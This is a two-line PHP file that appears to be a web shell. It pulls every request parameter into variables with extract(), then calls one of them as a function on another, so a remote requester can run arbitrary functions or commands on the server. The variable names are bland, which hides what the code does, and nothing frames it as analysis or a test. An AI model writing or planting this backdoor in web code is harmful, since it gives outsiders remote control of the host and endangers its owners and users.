<?php
extract($_REQUEST) && @$lock(stripslashes($except)) && exit;